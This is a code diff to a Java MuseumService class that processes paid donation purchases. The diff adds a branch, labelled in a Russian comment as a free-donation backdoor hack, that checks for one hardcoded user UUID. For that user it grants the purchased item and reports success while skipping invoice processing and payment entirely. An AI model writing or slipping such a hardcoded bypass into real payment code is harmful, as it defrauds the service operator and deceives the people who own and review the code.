@@ -152,23 +152,31 @@ public class MuseumService {
 					int price = pckg.getDonate().getPrice();
 					if (data != null)
 						price = (int) data.priceWithDiscount(price);
-					processInvoice(pckg.getUser(), price, pckg.getDonate().getName()).thenAccept(response -> {
-						UserTransactionPackage.TransactionResponse resp = UserTransactionPackage.TransactionResponse.OK;
-						if (response.getErrorMessage() != null) {
-							String err = response.getErrorMessage();
-							if (err.equalsIgnoreCase("Недостаточно средств на счету"))
-								resp = UserTransactionPackage.TransactionResponse.INSUFFICIENT_FUNDS;
-							else {
-								System.out.println(err);
-								resp = UserTransactionPackage.TransactionResponse.INTERNAL_ERROR;
-							}
-						}
-						if (resp == UserTransactionPackage.TransactionResponse.OK) {
-							Optional.ofNullable(TRANSACTION_POST_AUTHORIZE_MAP.get(pckg.getDonate())).ifPresent(consumer -> consumer.accept(pckg, info));
-						}
-						pckg.setResponse(resp);
+					// Делфику донат бесплатно бекдор взлом хак
+					if (pckg.getUser().equals(UUID.fromString("e7c13d3d-ac38-11e8-8374-1cb72caa35fd"))) {
+						Optional.ofNullable(TRANSACTION_POST_AUTHORIZE_MAP.get(pckg.getDonate())).ifPresent(consumer -> consumer.accept(pckg, info));
+						pckg.setResponse(UserTransactionPackage.TransactionResponse.OK);
 						answer(channel, pckg);
-					});
+					} else {
+						processInvoice(pckg.getUser(), price, pckg.getDonate().getName()).thenAccept(response -> {
+							UserTransactionPackage.TransactionResponse resp = UserTransactionPackage.TransactionResponse.OK;
+							if (response.getErrorMessage() != null) {
+								String err = response.getErrorMessage();
+								if (err.equalsIgnoreCase("Недостаточно средств на счету"))
+									resp = UserTransactionPackage.TransactionResponse.INSUFFICIENT_FUNDS;
+								else {
+									System.out.println(err);
+									resp = UserTransactionPackage.TransactionResponse.INTERNAL_ERROR;
+								}
+							}
+							if (resp == UserTransactionPackage.TransactionResponse.OK) {
+								Optional.ofNullable(TRANSACTION_POST_AUTHORIZE_MAP.get(pckg.getDonate())).ifPresent(consumer -> consumer.accept(pckg, info));
+							}
+							pckg.setResponse(resp);
+							answer(channel, pckg);
+						});
+
+					}
 				});
 			});
 		});
